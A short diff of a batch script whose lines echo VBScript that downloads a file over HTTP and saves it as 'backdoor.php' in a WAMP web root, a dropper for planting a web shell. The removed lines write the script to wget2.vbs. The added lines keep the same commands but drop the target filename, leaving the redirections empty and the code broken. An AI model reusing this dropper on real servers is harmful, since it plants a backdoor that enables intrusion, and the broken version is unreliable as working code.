@@ -1,10 +1,10 @@
-echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP") >wget2.vbs
-echo dim bStrm: Set bStrm = createobject("Adodb.Stream") >> wget2.vbs
-echo xHttp.Open "GET", "http://localhost/main.txt", False >> wget2.vbs
-echo xHttp.Send >> wget2.vbs
-echo with bStrm >> wget2.vbs
-echo     .type = 1 '//binary >> wget2.vbs
-echo     .open >> wget2.vbs
-echo     .write xHttp.responseBody >> wget2.vbs
-echo     .savetofile "c:\wamp\www\backdoor.php", 2 '//overwrite >> wget2.vbs
-echo end with >> wget2.vbs
+echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP") >
+echo dim bStrm: Set bStrm = createobject("Adodb.Stream") >> 
+echo xHttp.Open "GET", "http://localhost/main.txt", False >> 
+echo xHttp.Send >> 
+echo with bStrm >> 
+echo     .type = 1 '//binary >> 
+echo     .open >> 
+echo     .write xHttp.responseBody >> 
+echo     .savetofile "c:\wamp\www\backdoor.php", 2 '//overwrite >> 
+echo end with >> 
